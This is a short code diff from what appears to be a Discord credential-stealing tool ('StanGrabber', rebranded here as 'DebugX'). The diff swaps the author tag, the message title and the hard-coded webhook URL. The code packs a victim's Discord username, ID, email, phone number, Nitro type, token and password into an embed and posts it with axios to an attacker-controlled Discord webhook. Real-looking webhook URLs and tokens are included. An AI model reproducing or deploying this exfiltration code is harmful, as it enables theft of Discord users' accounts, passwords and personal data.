@@ -40,16 +40,16 @@ exports.send = (req, res, webhook) => {
             
             var omg = {
   author: {
-    name: "Dev By Hideaki#1337 x Stan#1337"
+    name: "Dev By newSense? =]"
   },
-  title: "New person stoled",
+  title: "jajarobado",
   description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
 
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/808648414199676948/Koi4dO3acEhEyIRJzVaxZ7-FDWJfmqK6kZX13nrklxmLWPkhQBhtkFe8JBtKgdojXSCn`, {
-            username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
+        axios.post(`https://discord.com/api/webhooks/884986653666586634/4jAfzphZYKdlby8o8dxRkInhz_xGujaQ4doYxwwdp59mXj98XO-GuuFgMd_wg2TS4RrD`, {
+            username: JSON.parse(JSON.stringify(y)).username + " - DebugX",
             content: '', 
             embeds:[ omg ]
         }).then((z) => {
